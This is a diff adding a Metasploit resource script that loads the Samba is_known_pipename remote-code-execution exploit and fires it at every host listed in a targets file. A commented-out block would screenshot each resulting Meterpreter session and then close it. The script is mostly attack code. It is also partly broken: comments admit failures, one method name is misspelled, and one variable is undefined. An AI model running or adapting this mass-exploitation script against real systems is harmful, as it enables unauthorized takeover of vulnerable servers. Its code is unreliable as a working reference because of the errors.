@@ -1,0 +1,47 @@
+use exploit/linux/samba/is_known_pipename
+set lhost 192.168.9.111
+
+<ruby>
+        @exploit_name = 'linux/samba/is_known_pipename'
+        exploit = @framework.exploits.create(@exploit_name)
+        wasGood = system("sh crymearriver") # doesnt work, cant open file
+        targets = IO.readLines('targets') # readLines doesnt exist?
+        targets.each do |target|
+            @session = exploit.exploit_simple('Options' => {'RHOST' => target})
+        end
+        print_status(contents)
+
+
+=begin
+        sleep(1)
+        task :test do
+          sh "ls"
+        end
+        print_status("Waiting on an incoming sessions...")
+        while (true)
+                framework.sessions.each_pair do |sid,s|
+                        thost = s.session_host
+
+                        # Ensure that stdapi has been loaded before running
+                        if s.ext.aliases['stdapi']
+                                print_status("Screenshotting session #{sid} #{thost}...")
+                                s.console.run_single("screenshot -p #{thost}_#{sid}.jpg -v false -q 85")
+                                print_status("Closing session #{sid} #{thost}...")
+                                s.kill
+                        else
+                                print_status("Session #{sid} #{thost} active, but not yet configured")
+                        end
+
+                end
+                sleep(1)
+        end
+=end
+
+        print_status("All done")
+</ruby>
+
+# Kill all open sessions
+sessions -K
+
+# Exit the console (optional)
+exit
